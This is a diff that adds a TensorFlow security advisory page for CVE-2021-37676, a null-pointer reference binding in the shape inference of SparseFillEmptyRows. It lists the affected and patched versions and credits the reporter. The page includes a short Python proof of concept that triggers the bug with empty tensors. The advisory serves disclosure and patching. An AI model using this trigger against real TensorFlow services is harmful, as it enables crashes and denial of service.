@@ -1,0 +1,31 @@
+<h2>TFSA-2021-149: Reference binding to nullptr in shape inference</h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-37676</p>
+<h3>Impact</h3>
+<p>An attacker can cause undefined behavior via binding a reference to null pointer
+in <code>tf.raw_ops.SparseFillEmptyRows</code>:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>tf.compat.v1.disable_v2_behavior()
+tf.raw_ops.SparseFillEmptyRows(
+  indices = tf.constant([], shape=[0, 0], dtype=tf.int64),
+  values = tf.constant([], shape=[0], dtype=tf.int64),
+  dense_shape = tf.constant([], shape=[0], dtype=tf.int64),
+  default_value = 0)
+```</p>
+<p>The shape inference
+<a href="https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/ops/sparse_ops.cc#L608-L634">implementation</a>
+does not validate that the input arguments are not empty tensors.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/578e634b4f1c1c684d4b4294f9e5281b2133b3ed">578e634b4f1c1c684d4b4294f9e5281b2133b3ed</a>.</p>
+<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this
+commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are
+also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>
